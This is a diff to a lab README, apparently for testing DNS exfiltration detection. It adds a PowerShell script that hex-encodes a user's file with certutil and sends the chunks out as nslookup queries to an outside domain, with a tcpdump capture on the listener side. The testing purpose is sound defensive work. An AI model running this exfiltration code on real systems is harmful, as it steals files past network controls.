@@ -245,6 +245,21 @@ tcpdump -n udp port 53 -i any | tee raw_output.txt
 
 On the client to be tested open PowerShell ISE and copy the contents of the script `DNS_Exfiltration.ps1` located in the scripts folder of this repository. Take note of the `$domain` variable as this will need to be updated to match the value shown in the output of the terraform command. 
 
+```powershell
+$domain = 'exfiltracer123.hulkgosmash.com'
+$ns = "ns.$domain"
+certutil -encodehex -f $env:USERPROFILE\exfil.txt $env:USERPROFILE\exfil.hex 4
+
+$text=Get-Content $env:USERPROFILE\exfil.hex
+$subdomain=$text.replace(" ","")
+$j=11111
+foreach($i in $subdomain) {
+    $final=$j.tostring()+"."+$i+".$ns"
+    $j += 1
+    Start-Process -NoNewWindow nslookup $final 
+}
+```
+
 ![Description of the image](images/14.png)
 
 One you have updated the `$domain` variable click on the green play button to execute the script. 
